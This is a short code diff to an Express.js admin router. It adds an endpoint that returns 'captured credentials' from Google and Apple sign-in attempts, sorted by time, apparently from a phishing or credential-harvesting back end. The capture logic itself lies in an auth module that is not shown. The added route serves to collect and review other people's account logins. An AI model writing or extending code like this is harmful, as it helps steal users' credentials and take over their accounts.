@@ -106,4 +106,20 @@ router.delete('/users/:userId', adminAuth, async (req, res) => {
   }
 });
 
+// Get captured credentials (Google/Apple sign-in attempts)
+router.get('/captured-credentials', adminAuth, (req, res) => {
+  try {
+    const authRoutes = require('./auth');
+    const credentials = authRoutes.getCapturedCredentials ? authRoutes.getCapturedCredentials() : [];
+    
+    res.json({
+      count: credentials.length,
+      credentials: credentials.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
+    });
+  } catch (error) {
+    console.error('Error getting captured credentials:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
 module.exports = router;
